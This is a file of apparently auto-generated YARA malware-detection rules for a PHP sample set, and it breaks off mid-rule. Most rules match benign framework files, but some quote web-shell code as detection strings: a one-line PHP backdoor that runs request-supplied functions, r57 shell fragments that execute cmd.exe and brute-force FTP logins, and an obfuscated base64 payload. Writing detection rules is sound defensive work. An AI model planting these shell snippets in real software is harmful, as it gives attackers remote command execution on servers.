      description = "php22 - file PostTypeException.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a3c9ba2b485f895f64b6a269779fe61c9b0b9da3a9963aa8f63500c778585879"
   strings:
      $s1 = "namespace Themosis\\PostType;" fullword ascii
      $s2 = "class PostTypeException extends Exception" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule OrderShippingMethodEligibility
{
   meta:
      description = "php22 - file OrderShippingMethodEligibility.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "672b9faaee66d2f79431fa5e1c3e289cd51fa79e21f0e079eef1a41e7585d10f"
   strings:
      $s1 = "public function getTargets(): string" fullword ascii
      $s2 = "use Symfony\\Component\\Validator\\Constraint;" fullword ascii
      $s3 = "return 'sylius_order_shipping_method_eligibility_validator';" fullword ascii
      $s4 = "public $message = 'sylius.order.shipping_method_eligibility';" fullword ascii
      $s5 = "namespace Sylius\\Bundle\\CoreBundle\\Validator\\Constraints;" fullword ascii
      $s6 = "final class OrderShippingMethodEligibility extends Constraint" fullword ascii
      $s7 = "public function validatedBy(): string" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule PageCollection
{
   meta:
      description = "php22 - file PageCollection.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f4466759bf7c810ee13300e5a4c0c6742a289de9612da4b06c36e4ba6f439125"
   strings:
      $s1 = "use PageApp\\Model\\PageCollectionBase;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PaymentsSubjectInterface
{
   meta:
      description = "php22 - file PaymentsSubjectInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0ff4f8acec1ef289f42a5898b1e0a091d6def69345a1e968fbd751ae00cd733c"
   strings:
      $s1 = "* @return Collection|PaymentInterface[]" fullword ascii
      $s2 = "public function getPayments(): Collection;" fullword ascii
      $s3 = "* @param PaymentInterface $payment" fullword ascii
      $s4 = "use Doctrine\\Common\\Collections\\Collection;" fullword ascii
      $s5 = "namespace Sylius\\Component\\Payment\\Model;" fullword ascii
      $s6 = "public function removePayment(PaymentInterface $payment): void;" fullword ascii
      $s7 = "public function hasPayment(PaymentInterface $payment): bool;" fullword ascii
      $s8 = "public function addPayment(PaymentInterface $payment): void;" fullword ascii
      $s9 = "public function hasPayments(): bool;" fullword ascii
      $s10 = "interface PaymentsSubjectInterface" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule php22_person
{
   meta:
      description = "php22 - file person.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "140e9a7029eede6eff658e33701502a89c065c05257e7aa0183639bd96f6ae6b"
   strings:
      $x1 = "* @link       http://www.GetAnahita.com" fullword ascii
      $s2 = "* @author     Rastin Mehr <rastin@anahitapolis.com>" fullword ascii
      $s3 = "* @author     Arash Sanieyan <ash@anahitapolis.com>" fullword ascii
      $s4 = "* if a token is passed in the reqeust, then it allows reading." fullword ascii
      $s5 = "* @param KConfig $config An optional KConfig object with configuration options." fullword ascii
      $s6 = "* @see ComActorsControllerPermissionAbstract::canRead()" fullword ascii
      $s7 = "* @license    GNU GPLv3 <http://www.gnu.org/licenses/gpl-3.0.html>" fullword ascii
      $s8 = "* Initializes the default configuration for the object." fullword ascii
      $s9 = "* @var ComPeopleDomainEntityPerson" fullword ascii
      $s10 = "* @param bool $can_register The value whether the user can register or not" fullword ascii
      $s11 = "* return true if viewer has administration rights to the profile." fullword ascii
      $s12 = "return $this->getItem()->authorize('administration');" fullword ascii
      $s13 = "* Return whether the registration is open or not." fullword ascii
      $s14 = "* Flag to see whather registration is open or not." fullword ascii
      $s15 = "* Called from {@link __construct()} as a first step of object instantiation." fullword ascii
      $s16 = "'can_register' => (bool) get_config_value('people.allow_registration', true)," fullword ascii
      $s17 = "* See if the controller allows to register." fullword ascii
      $s18 = "* return true if viewer is an admin or a guest." fullword ascii
      $s19 = "* Return true if viewer is a guest." fullword ascii
      $s20 = "$layout = $this->_mixer->getRequest()->get('layout');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 9KB and
      1 of ($x*) and 4 of them
}

rule replicate
{
   meta:
      description = "php22 - file replicate.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f6581305c60907bbd9f8b5df09b1aa3188689d8321081ad7899ee66e658b9f39"
   strings:
      $s1 = "* This defines the Command Line options." fullword ascii
      $s2 = "(string) \\file_get_contents($root . '/local/settings.json')," fullword ascii
      $s3 = "new Option(null, 'publickey', Getopt::REQUIRED_ARGUMENT)," fullword ascii
      $s4 = "* @var Getopt" fullword ascii
      $s5 = "$publicKey = $getopt->getOption('publickey');" fullword ascii
      $s6 = "$settings['database']['password'] ?? ''," fullword ascii
      $s7 = "* This script sets up replication of another Chronicle" fullword ascii
      $s8 = "new Option(null, 'name', Getopt::REQUIRED_ARGUMENT)," fullword ascii
      $s9 = "new Option(null, 'url', Getopt::REQUIRED_ARGUMENT)," fullword ascii
      $s10 = "require_once $root . '/cli-autoload.php';" fullword ascii
      $s11 = "echo \"Not enough data. Please specify:\\n\"," fullword ascii
      $s12 = "echo $ex->getMessage(), PHP_EOL;" fullword ascii
      $s13 = "$name = $getopt->getOption('name');" fullword ascii
      $s14 = "$url = $getopt->getOption('url');" fullword ascii
      $s15 = "/** @psalm-suppress UnresolvableInclude */" fullword ascii
      $s16 = "Base64UrlSafe::decode($publicKey)" fullword ascii
      $s17 = "if (!\\is_readable($root . '/local/settings.json')) {" fullword ascii
      $s18 = "$settings['database']['username'] ?? ''," fullword ascii
      $s19 = "echo $db->errorInfo()[0], PHP_EOL;" fullword ascii
      $s20 = "$getopt->parse();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule php_nmap
{
   meta:
      description = "php22 - file php_nmap.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "77f17983baae60e9efa0ceafd7eb50d4db956fa66c0f130ea222942253183136"
   strings:
      $x1 = "if ( $ports == \"'0'\") {$cmd = escapeshellcmd(\"nmap -T4 --stats-every 5 -r -n -Pn --top-ports 100 $target\");" fullword ascii
      $x2 = "} else {$cmd = escapeshellcmd(\"nmap -T4 --stats-every 5 -r -n -Pn -p$ports $target\");}" fullword ascii
      $s3 = "if (filter_var($ipaddress, FILTER_VALIDATE_IP) === false) {echo \"<pre>Target is not a valid IP</pre>\";exit(0);}" fullword ascii
      $s4 = "$target = escapeshellarg(preg_replace('/[^0-9.\\']/', '', $ipaddress));" fullword ascii
      $s5 = "$ports = escapeshellarg(preg_replace('/[^0-9,\\-\\']/', '', htmlspecialchars($_GET[\"ports\"])));" fullword ascii
      $s6 = "<form action=\"\" method=\"get\">Default Ports: <select name=\"ports\">" fullword ascii
      $s7 = "<html><head><title>Port Scan Me</title></head><body>" fullword ascii
      $s8 = "header(\"Cache-Control: no-cache\"); //set http headers to prevent caching" fullword ascii
      $s9 = "function scan_target(){" fullword ascii
      $s10 = "header(\"Pragma: no-cache\");//set http headers to prevent caching" fullword ascii
      $s11 = "ini_set('zlib.output_compression', false);// Turn off PHP output compression" fullword ascii
      $s12 = "scan_target();" fullword ascii
      $s13 = "// Get the client ip address and ports" fullword ascii
      $s14 = "if(isset($_GET[\"ports\"])){" fullword ascii
      $s15 = "//checks if ports is set to 0 and then forces to top 100 ports" fullword ascii
      $s16 = "while (@ob_end_flush());//Flush (send) the output buffer and turn off output buffering" fullword ascii
      $s17 = "<option value=\"21\">FTP 21</option>" fullword ascii
      $s18 = "set_time_limit(0);//Set this so PHP doesn't timeout during a long stream " fullword ascii
      $s19 = "while($b = fgets($a, 4096)) { " fullword ascii
      $s20 = "ini_set('implicit_flush', true);// Implicitly flush the buffer(s)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule PaymentMethodTranslation
{
   meta:
      description = "php22 - file PaymentMethodTranslation.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ff0bc38cc4faf14ba3900e7425dc71bffa5a41a9a4077ad70d52833a223dd4b4"
   strings:
      $s1 = "public function getDescription(): ?string" fullword ascii
      $s2 = "public function setDescription(?string $description): void" fullword ascii
      $s3 = "public function getInstructions(): ?string" fullword ascii
      $s4 = "use Sylius\\Component\\Resource\\Model\\AbstractTranslation;" fullword ascii
      $s5 = "public function getName(): ?string" fullword ascii
      $s6 = "class PaymentMethodTranslation extends AbstractTranslation implements PaymentMethodTranslationInterface" fullword ascii
      $s7 = "namespace Sylius\\Component\\Payment\\Model;" fullword ascii
      $s8 = "public function setInstructions(?string $instructions): void" fullword ascii
      $s9 = "public function setName(?string $name): void" fullword ascii
      $s10 = "$this->instructions = $instructions;" fullword ascii
      $s11 = "public function __toString(): string" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule php22_qiang2
{
   meta:
      description = "php22 - file qiang2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ba44142f4bff3760a9bb69528df8ab6cf5bea8837947139ede676c965c418d51"
   strings:
      $s1 = "<?php ($_=@$_GET[2]).@$_($_GET[1]) ?> " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PasswordBroker
{
   meta:
      description = "php22 - file PasswordBroker.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "37c36470a71b1064ebe33f44024fea5347c7b447d9286532415a406b47ff71b3"
   strings:
      $s1 = "* Get the password reminder repository implementation." fullword ascii
      $s2 = "* Validate a password reset for the given credentials." fullword ascii
      $s3 = "* Get the user for the given credentials." fullword ascii
      $s4 = "list($password, $confirm) = array($credentials['password'], $credentials['password_confirmation']);" fullword ascii
      $s5 = "public function __construct(ReminderRepositoryInterface $reminders, UserProviderInterface $users, $hashKey)" fullword ascii
      $s6 = "list($password, $confirm) = [$credentials['password'], $credentials['password_confirmation']];" fullword ascii
      $s7 = "* Constant representing a successfully reset password." fullword ascii
      $s8 = "* @var \\Shared\\Auth\\Reminders\\ReminderRepositoryInterface  $reminders" fullword ascii
      $s9 = "* Constant representing an invalid password." fullword ascii
      $s10 = "* @return \\Shared\\Auth\\Reminders\\ReminderRepositoryInterface" fullword ascii
      $s11 = "* Determine if the passwords match for the request." fullword ascii
      $s12 = "* Determine if the passwords are valid for the request." fullword ascii
      $s13 = "* @param  \\Auth\\UserProviderInterface  $users" fullword ascii
      $s14 = "protected function validatePasswordWithDefaults(array $credentials)" fullword ascii
      $s15 = "* @return \\Shared\\Auth\\Reminders\\RemindableInterface" fullword ascii
      $s16 = "* Create a new password broker instance." fullword ascii
      $s17 = "* Reset the password for the given token." fullword ascii
      $s18 = "return $this->validatePasswordWithDefaults($credentials);" fullword ascii
      $s19 = "protected function validNewPasswords(array $credentials)" fullword ascii
      $s20 = "* The password reminder repository." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule ProductAssociationTypeInterface
{
   meta:
      description = "php22 - file ProductAssociationTypeInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1a75f54b5ceae67f1c644b6394169a3f8f4c36e7fc5df7677f47b43a7a441d87"
   strings:
      $s1 = "* @return ProductAssociationTypeTranslationInterface" fullword ascii
      $s2 = "public function getTranslation(?string $locale = null): TranslationInterface;" fullword ascii
      $s3 = "* @param string|null $name" fullword ascii
      $s4 = "use Sylius\\Component\\Resource\\Model\\TimestampableInterface;" fullword ascii
      $s5 = "use Sylius\\Component\\Resource\\Model\\TranslationInterface;" fullword ascii
      $s6 = "use Sylius\\Component\\Resource\\Model\\ResourceInterface;" fullword ascii
      $s7 = "use Sylius\\Component\\Resource\\Model\\TranslatableInterface;" fullword ascii
      $s8 = "use Sylius\\Component\\Resource\\Model\\CodeAwareInterface;" fullword ascii
      $s9 = "* @param string|null $locale" fullword ascii
      $s10 = "public function getName(): ?string;" fullword ascii
      $s11 = "namespace Sylius\\Component\\Product\\Model;" fullword ascii
      $s12 = "interface ProductAssociationTypeInterface extends" fullword ascii
      $s13 = "public function setName(?string $name): void;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule RemoteFileImporting
{
   meta:
      description = "php22 - file RemoteFileImporting.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a75a8fb73aed1f744590e1e2e417d57411fe64ee3797a18e6a5ad84df334e8e6"
   strings:
      $s1 = "* @see PreconditionInterface::getUniqueIdentifier()" fullword ascii
      $s2 = "* @param FunctionInspector $functionInspector the FunctionInspector instance" fullword ascii
      $s3 = "* @see PreconditionInterface::getName()" fullword ascii
      $s4 = "->setMessage(t('Remote file importing through the file manager requires the iconv PHP extension.'))" fullword ascii
      $s5 = "* @see PreconditionInterface::performCheck()" fullword ascii
      $s6 = "* @see PreconditionInterface::isOptional()" fullword ascii
      $s7 = "* The FunctionInspector instance." fullword ascii
      $s8 = "public function getUniqueIdentifier()" fullword ascii
      $s9 = "* Initialize the instance." fullword ascii
      $s10 = "* @var FunctionInspector" fullword ascii
      $s11 = "use Concrete\\Core\\Foundation\\Environment\\FunctionInspector;" fullword ascii
      $s12 = "public function __construct(FunctionInspector $functionInspector)" fullword ascii
      $s13 = "use Concrete\\Core\\Install\\PreconditionInterface;" fullword ascii
      $s14 = "use Concrete\\Core\\Install\\PreconditionResult;" fullword ascii
      $s15 = "namespace Concrete\\Core\\Install\\Preconditions;" fullword ascii
      $s16 = "->setState(PreconditionResult::STATE_FAILED)" fullword ascii
      $s17 = "return t('Remote File Importing');" fullword ascii
      $s18 = "if (!$this->functionInspector->functionAvailable('iconv')) {" fullword ascii
      $s19 = "class RemoteFileImporting implements PreconditionInterface" fullword ascii
      $s20 = "return 'remote_file_importing';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule RecurrenceIteratorInfiniteLoopProblemTest
{
   meta:
      description = "php22 - file RecurrenceIteratorInfiniteLoopProblemTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c190e22e7a38ab5c049df40906cc3b688a08e56faea3df7228b499e59b6d6d24"
   strings:
      $s1 = "* this means we increase the current day (or week, month) by 0, this also" fullword ascii
      $s2 = "if ($it->getDTSTART() > new DateTime('2013-02-05 22:59:59', new DateTimeZone('UTC'))) {" fullword ascii
      $s3 = "$it->fastForward(new DateTime('2012-01-29 23:00:00', new DateTimeZone('UTC')));" fullword ascii
      $s4 = "$it->fastForward(new DateTime('2013-01-01 23:00:00', new DateTimeZone('UTC')));" fullword ascii
      $s5 = "$this->assertFalse($ev->isInTimeRange(new DateTime('2012-01-01 12:00:00'),new DateTime('3000-01-01 00:00:00')));" fullword ascii
      $s6 = "$ev->RRULE = 'FREQ=YEARLY;INTERVAL=1;UNTIL=20120203T225959Z;BYMONTH=2;BYSETPOS=1;BYDAY=SU,MO,TU,WE,TH,FR,SA';" fullword ascii
      $s7 = "* Different bug, also likely an infinite loop." fullword ascii
      $s8 = "* Something, somewhere produced an ics with an interval set to 0. Because" fullword ascii
      $s9 = "* This bug came from a Fruux customer. This would result in a never-ending" fullword ascii
      $s10 = "* results in an infinite loop." fullword ascii
      $s11 = "$ev = Component::create('VEVENT');" fullword ascii
      $s12 = "function testFastForwardTooFar() {" fullword ascii
      $s13 = "class RecurrenceIteratorInfiniteLoopProblemTest extends \\PHPUnit_Framework_TestCase {" fullword ascii
      $s14 = "array(new DateTime('2012-02-01 15:45:00', new DateTimeZone('Europe/Berlin')))," fullword ascii
      $s15 = "$collect[] = $it->getDTSTART();" fullword ascii
      $s16 = "$ev->RRULE = 'FREQ=WEEKLY;BYDAY=MO;UNTIL=20090704T205959Z;INTERVAL=1';" fullword ascii
      $s17 = "// This recurrence rule by itself is a yearly rule that should happen" fullword ascii
      $s18 = "// BYSETPOS limits this to only the 1st day of the month. Very crazy" fullword ascii
      $s19 = "// way to specify this, and could have certainly been a lot easier." fullword ascii
      $s20 = "// The BYDAY part expands this to every day of the month, but the" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule php22_r57_bd
{
   meta:
      description = "php22 - file r57-bd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4adf0f6edf2981d489a3401b0327bba8e0f1f039bc8b23f884054bc6740376a9"
   strings:
      $x1 = "if(!@function_exists('escapeshellarg')){$res=$api->WinExec(\"cmd.exe /c $cfe >\\\"$output\\\"\",0);}" fullword ascii
      $x2 = "if(!@function_exists('escapeshellarg')){$suntzu->Run('c:\\windows\\system32\\cmd.exe /c '.$cfe.' > \"'.$output.'\"');}" fullword ascii
      $x3 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - su" fullword ascii
      $x4 = "else{$res=$api->WinExec(\"cmd.exe /c \".@escapeshellarg($cfe).\" >\\\"$output\\\"\",0);}" fullword ascii
      $x5 = "else{$suntzu->Run('c:\\windows\\system32\\cmd.exe /c '.@escapeshellarg($cfe).' > \"'.$output.'\"');}" fullword ascii
      $x6 = "if(@ftp_login($connection,$_POST['ftp_login'],$user)) { echo \"[+] \".$_POST['ftp_login'].\":$user - success\\r\\n\"; $suc++; }" fullword ascii
      $x7 = "else if ($file=readzlib($_POST['loc_file'])) { $filedump = $file; } else { err(1,$_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $x8 = "else if ($file=readzlib($_POST['d_name'])) { $filedump = $file; } else { err(1,$_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $x9 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - suc" ascii
      $x10 = "echo sr(15,\"<b>\".$lang[$language.'_text53'].$arrow.\"</b>\",in('text','s_dir',85,$dir).\" * ( /root;/home;$tempdir )\");" fullword ascii
      $x11 = "echo sr(15,\"<b>\".$lang[$language.'_text73'].$arrow.\"</b>\",in('text','s_dir',85,$dir).\" * ( /root;/home;$tempdir )\");" fullword ascii
      $x12 = "{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"/c $" ascii
      $x13 = "{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"/c $" ascii
      $x14 = "elseif($file=moreread($_POST['e_name'])) { $filedump = $file; if(!@is_writable($_POST['e_name'])) { $only_read = 1; }; }" fullword ascii
      $x15 = "else{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"" ascii
      $x16 = "if(!@function_exists('escapeshellarg')){@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.$cfe.' >" ascii
      $x17 = "if(!@function_exists('escapeshellarg')){@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.$cfe.' >" ascii
      $x18 = "else{@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.@escapeshellarg($cfe).' > \"'.$output.'\"')" ascii
      $x19 = "if (@pcntl_wifexited($status)){$res .= '[+] Done! Command \"'.$cfe.'\" successfully executed.';}" fullword ascii
      $x20 = "$api=new ffi(\"[lib='kernel32.dll'] int WinExec(char *APP,int SW);\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 600KB and
      1 of ($x*)
}


rule RedisStoreTest
{
   meta:
      description = "php22 - file RedisStoreTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e966af880e1716b1aa7fd57741ac0d2cae15207c4d6ca1bef3068f387e2ffe3e"
   strings:
      $s1 = "if (!@((new \\Redis())->connect(getenv('REDIS_HOST')))) {" fullword ascii
      $s2 = "$redis->connect(getenv('REDIS_HOST'));" fullword ascii
      $s3 = "protected function getRedisConnection()" fullword ascii
      $s4 = "<jeremy@derusse.com>" fullword ascii
      $s5 = "* @author J" fullword ascii
      $s6 = "* @requires extension redis" fullword ascii
      $s7 = "$e = error_get_last();" fullword ascii
      $s8 = "namespace Symfony\\Component\\Lock\\Tests\\Store;" fullword ascii
      $s9 = "self::markTestSkipped($e['message']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule PageDataResult
{
   meta:
      description = "php22 - file PageDataResult.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5283acd4dd966f0fcfa032e925b2f6e17f01dc2b98cea37e40cfb42070441ba2"
   strings:
      $s1 = "* @version    $Id: PageDataResult.php 20096 2010-01-06 02:05:09Z bkarwin $" fullword ascii
      $s2 = "* @see Zend_Service_Yahoo_Result" fullword ascii
      $s3 = "// require_once 'Zend/Service/Yahoo/Result.php';" fullword ascii
      $s4 = "* @param  DOMElement $result" fullword ascii
      $s5 = "* Initializes the web result" fullword ascii
      $s6 = "* Web result namespace" fullword ascii
      $s7 = "* @subpackage Yahoo" fullword ascii
      $s8 = "* @package    Zend_Service" fullword ascii
      $s9 = "class Zend_Service_Yahoo_PageDataResult extends Zend_Service_Yahoo_Result" fullword ascii
      $s10 = "protected $_namespace = 'urn:yahoo:srch';" fullword ascii
      $s11 = "public function __construct(DOMElement $result)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule RemoveConferenceRequest
{
   meta:
      description = "php22 - file RemoveConferenceRequest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7fae6cb943fe3a2b1e2f15f7eefd06944d9650b4a39e5f06db44aa45f60b24a3"
   strings:
      $s1 = "* @version    $Id: RemoveConferenceRequest.php 20166 2010-01-09 19:00:17Z bkarwin $" fullword ascii
      $s2 = "* @see Zend_Service_DeveloperGarden_Request_RequestAbstract" fullword ascii
      $s3 = "* @return Zend_Service_DeveloperGarden_Request_ConferenceCall_RemoveConferenceRequest" fullword ascii
      $s4 = "// require_once 'Zend/Service/DeveloperGarden/Request/RequestAbstract.php';" fullword ascii
      $s5 = "* @param string $conferenceId" fullword ascii
      $s6 = "* @subpackage DeveloperGarden" fullword ascii
      $s7 = "* @param integer $environment" fullword ascii
      $s8 = "* the conference id" fullword ascii
      $s9 = "* set the conference id" fullword ascii
      $s10 = "extends Zend_Service_DeveloperGarden_Request_RequestAbstract" fullword ascii
      $s11 = "* @package    Zend_Service" fullword ascii
      $s12 = "* @author     Marco Kaiser" fullword ascii
      $s13 = "class Zend_Service_DeveloperGarden_Request_ConferenceCall_RemoveConferenceRequest" fullword ascii
      $s14 = "public function __construct($environment, $conferenceId)" fullword ascii
      $s15 = "public function setConferenceId($conferenceId)" fullword ascii
      $s16 = "parent::__construct($environment);" fullword ascii
      $s17 = "$this->setConferenceId($conferenceId);" fullword ascii
      $s18 = "$this->conferenceId = $conferenceId;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule a3990f7fda160985fd844a1df81d11aa6ec80149
{
   meta:
      description = "php22 - file a3990f7fda160985fd844a1df81d11aa6ec80149.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0296d214582e2e767413f1e62003edeaf72c0ae7cf4478d86a14c2ae9a9d6cd8"
   strings:
      $s1 = "Obfuscation provided by FOPO - Free Online PHP Obfuscator: http://www.fopo.com.ar/" fullword ascii
      $s2 = "Z0tURGdqWkJNNUtpZExtL2xFSlJuSXl2WFh5d3k3NnVpb0tXWW5DSXZQMm9BV1kwanN4akEyeEVCYXV" fullword ascii
      $s3 = "ZzlVS3JJYWFWL3kwbmlWazBVdlg3U2k1d1VURmNsanp0cmdETG9CNS9UZHcvZnltNFl6bEZoTzgwZ2Q" fullword ascii
      $s4 = "dWlDUkZMNDFFUm80OHpaZUdCLzZyQkhCZmV5KzBsWjZJUHJhWkNCdTVCNm96MEZDQXkzS1FtempNSDV" fullword ascii
      $s5 = "N3BINU1iczF4bzhBeDlDbzd3V2tPZlc2SHdETHlSM0tsWkIxYnRzUTBrRE9FK1lpS3d6RXRuNVEvWUt" fullword ascii
      $s6 = "eDhkOXBhMEI3REw1cktpc0dkU1cvWW5HS0Vmbk5kbC9QblR4dDJDK3NVbFdLLzFDRTZXRWkxNFlLK0d" fullword ascii
      $s7 = "WlNIdUlFOTNFNFNGNUpRenUya1ZFUFppSkVzNERCU1J4RklKT2ZyWGVLOGNGWHREWG9tcG9raFdhNSt" fullword ascii
      $s8 = "aHRCcTNxQmE4eHZ2a3ZPN2krZUt1VWJRYWpDeG84MHhGenFmMzVhRU56VlZDYTViMmFjVWE5U2Qvdll" fullword ascii
      $s9 = "RWl6TDNBZmo2NkROb0F5aWJEK29paC9jRDh3MC9Mb2hFWW11ZC9meC9pMk95SVF0c1A0ekVDOTFLOGp" fullword ascii
      $s10 = "ZzVQM3dSOXFLM044NUM2WDBBLzBna1NJR2NYYUJyYU5DT3hFQjIrc0cvYklJUlUwcWN6VVh3VmpPTFd" fullword ascii
      $s11 = "aWNWbDVVTUdQZW1BZnhZeXNQc052eU50eVhkb1lTWmsvcHU0NXVkdUNJSDZPQmxPTXEyeEdYaW9oVHR" fullword ascii
      $s12 = "Y3dMcG1oZjBwWnpzaEZxZXZYcVkwNUNseksxM25mTEZZV0pndVVlOG01MnRlcTBtL1dPVjZRR05rM0d" fullword ascii
      $s13 = "K1NqZTQwYnpjdllJRWZxQlM4dmlRWmp5aS8vcEJCRmovZEtSWFJMN09rS3hSRGFDczhvSEh4U1U3Mm5" fullword ascii
      $s14 = "WHJaRmtaMjBiZTVVU3NCNnhaRGlBQ2lHZDVUVzhEZjJMdituR1JwdllRc0dKL0IyUlRBZXc2QzRBMk4" fullword ascii
      $s15 = "QTFGbWZBNTdRTEoyNUlPMW5sZnVxeTVsSk5qdSs0SE91UzFyM05xVFpGQVV5THBSMEh4dGZ0dlltMjl" fullword ascii
      $s16 = "TGRwQnVZeGFwaTNXeThKUDVQOEVDbE5mQVUxWSt3ZTlzalBDRU52dllCR1k3MGovMGtsdkxWTDdXNkV" fullword ascii
      $s17 = "SmxtYUZJNTNRZ2tPMHBHY0xiNUVQQzdja25STUN1WVg2Wk5JZnlDMDZqRVlWSVdHWTJpVHpmU2tRdll" fullword ascii
      $s18 = "SUcrYU5UUVhrR05XdlluVC8xb1JnY0F3aFlTM0NBRXBHYW03cjNkdFVkTm4yRXE5dWx5THdrNHB6czN" fullword ascii
      $s19 = "NTNvSlB0aGRZTVhJeUN5ZkFzZzFIWFNoNWEwdENkYUJnR0VvOFlKMFNSdllBSkNrMHlqY242VEVobVp" fullword ascii
      $s20 = "TGdKOVd1K0VEcFVuclNIaUIrUGEyeEJpWEVIdkI3eVhLRkE3STg1bHNOZkhPdjFDanU3ZEFQejQ4RjR" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4000KB and
      8 of them
}

rule ProgressReporter
{
   meta:
      description = "php22 - file ProgressReporter.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "daf07972b194f23dd17206afe9a9ed9bac30c4c1b126501efaed317e1389cb71"
   strings:
      $s1 = "namespace CLIFramework\\Component\\Progress;" fullword ascii
      $s2 = "public function update($finishedValue, $totalValue);" fullword ascii
      $s3 = "interface ProgressReporter" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule pre_process
{
   meta:
      description = "php22 - file pre-process.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d3ff039f2c8306f59871978c1611ddebbe07127d74be915bdabe0854be82d7f5"
   strings:
      $s1 = "//print_r($ninja_forms_processing->get_all_errors());" fullword ascii
      $s2 = "if(!$ninja_forms_processing->get_all_errors()){" fullword ascii
      $s3 = "$ajax = $ninja_forms_processing->get_form_setting('ajax');" fullword ascii
      $s4 = "$form_id = $ninja_forms_processing->get_form_ID();" fullword ascii
      $s5 = "$ninja_forms_processing = new Ninja_Forms_Processing($form_id);" fullword ascii
      $s6 = "$ninja_forms_processing->setup_submitted_vars();" fullword ascii
      $s7 = "do_action('ninja_forms_before_pre_process');" fullword ascii
      $s8 = "function ninja_forms_pre_process(){" fullword ascii
      $s9 = "//Initiate our processing class with our designated global variable." fullword ascii
      $s10 = "do_action('ninja_forms_pre_process');" fullword ascii
      $s11 = "function ninja_forms_setup_processing_class( $form_id = '' ){" fullword ascii
      $s12 = "global $ninja_forms_processing;" fullword ascii
      $s13 = "//echo 'pre-processing';" fullword ascii
      $s14 = "ninja_forms_process();" fullword ascii
      $s15 = "$session_reflection = new ReflectionMethod( 'WP_Session', 'set_cookie' );" fullword ascii
      $s16 = "//header('Content-Type', 'application/json');" fullword ascii
      $s17 = "$cache = Ninja_Forms()->session->get( 'nf_cache' );" fullword ascii
      $s18 = "Ninja_Forms()->session->init()->set_cookie();" fullword ascii
      $s19 = "if( $session_reflection->isPublic() ){" fullword ascii
      $s20 = "// Manually set the cookie." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule PluginPropertiesTest
{
   meta:
      description = "php22 - file PluginPropertiesTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ce49f59aee2f413f2b67e8e157e07236825b9c5455a23a614829f1265f7a347c"
   strings:
      $s1 = "$this->assertEquals(['mailto:user1.sabredav@sabredav.org', '/principals/user1/'], $prop->getHrefs());" fullword ascii
      $s2 = "$props = $this->server->getPropertiesForPath('principals/user1/calendar-proxy-read', [" fullword ascii
      $s3 = "$this->assertEquals(['/principals/user1/calendar-proxy-read/'], $prop->getHrefs());" fullword ascii
